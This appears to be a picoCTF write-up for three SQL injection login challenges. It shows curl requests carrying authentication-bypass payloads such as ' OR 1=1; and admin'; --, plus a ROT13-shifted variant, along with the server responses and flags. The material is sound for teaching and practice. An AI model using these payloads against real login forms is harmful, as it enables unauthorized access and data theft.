# Irish-Name-Repo (SQL Injection)

All about SQL Injection. The idea is to run SQL statements in a way the attacker wanted (since the developer doesn't know he/she opens a big loophole).

The attacker probably wants to bypass some conditions and/or extract information in database.

## 1

The crappy support page gives a hint of SQL. From the menu we can try to access the login page...

Try to login with some random input - failed for sure.

But when you check the POST request, it gives great hints - `debug=0`. (There is a hidden value in the form, that is really nice)

That is the same as the following `curl` command

```bash
# Seems -X POST not necessary
curl 'https://jupiter.challenges.picoctf.org/problem/50009/login.php' -X POST --data-raw 'username=admin&password=adddd&debug=0'
```

So we then change debug to 1

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/50009/login.php' -X POST --data-raw 'username=admin&password=adddd&debug=1'

<pre>username: admin
password: adddd
SQL query: SELECT * FROM users WHERE name='admin' AND password='adddd'
</pre><h1>Login failed.</h1>
```

Hmm ... let's try our luck to do SQL Injection. We want to make SQL statement like this

`SELECT * FROM users WHERE name='admin' AND password='' OR 1==1;`

So this statement will get pass the checking.

**Our aim is to make the password part becomes True so that the SQL statement returns the admin user without the correct password.**

Next, try to make our password to be `' OR 1=1;`

The tools in Firefox for request sending is nice.

```bash
# No need for double equal for SQL
curl 'https://jupiter.challenges.picoctf.org/problem/50009/login.php' -X POST --data-raw $'username=a&password=add\' OR 1=1;'

<h1>Logged in!</h1><p>Your flag is: picoCTF{that_flag}
```

Good practice problem for SQL injection.

## 2

Input fields are filtered.

`username=aa&password='&debug=1` Shows 500 error
`username=aa&password='OR&debug=1` Shows 200 (Failed login)
`username=aa` Shows 200 (Failed login)

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/53751/login.php' -X POST --data-raw $'username=a&password=add\' OR 1=1;&debug=1'

<pre>username: a
password: add' OR 1=1;
SQL query: SELECT * FROM users WHERE name='a' AND password='add' OR 1=1;'
</pre><h1>SQLi detected.</h1>
```

This time we try to trick the SQL by skipping the password check (the AND part)

The SQL we want:

```sql
SELECT * FROM users WHERE name='admin'; --' AND password='(whatever, it is now a comment now)'
```

So we try username with `admin'; --`

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/53751/login.php' -X POST --data-raw 'username=admin%27%3B --&password=ac&debug=1'

<pre>username: admin'; --
password: ac
SQL query: SELECT * FROM users WHERE name='admin'; --' AND password='ac'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{another_flag}</p>

```

## 3

This time user name field is removed.

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/40742/login.php' -X POST --data-raw 'password=adfas&debug=1'

<pre>password: adfas
SQL query: SELECT * FROM admin where password = 'nqsnf'
</pre><h1>Login failed.</h1>
```

Value changed?...Hmmm

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/40742/login.php' -X POST --data-raw 'password=qwertyuiop&debug=1'
<pre>password: qwertyuiop
SQL query: SELECT * FROM admin where password = 'djreglhvbc'

$ curl 'https://jupiter.challenges.picoctf.org/problem/40742/login.php' -X POST --data-raw 'password=asdfghjkl&debug=1'
<pre>password: asdfghjkl
SQL query: SELECT * FROM admin where password = 'nfqstuwxy'

$ curl 'https://jupiter.challenges.picoctf.org/problem/40742/login.php' -X POST --data-raw 'password=zxcvbnm&debug=1'
<pre>password: zxcvbnm
SQL query: SELECT * FROM admin where password = 'mkpioaz'

# Now we get all the letters ...

Its SQL is like:

```SQL
SELECT * FROM admin where password = '(input_value)'
```

We want to make this:

```SQL
SELECT * FROM admin where password = '' OR 1=1-- '
```

So our password is `' OR 1=1` (a space before OR, OR is substituted to BE)

Luckily this time the SQL Injection check is removed...

```bash
# Spaces doesn't matter
curl 'https://jupiter.challenges.picoctf.org/problem/40742/login.php' -X POST --data-raw $'password=\' BE \'1\'=\'1\'--&debug=1'

<pre>password: 'BE'1=1--
SQL query: SELECT * FROM admin where password = ''OR'1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{i_think_last_question_is_better}</p>
```
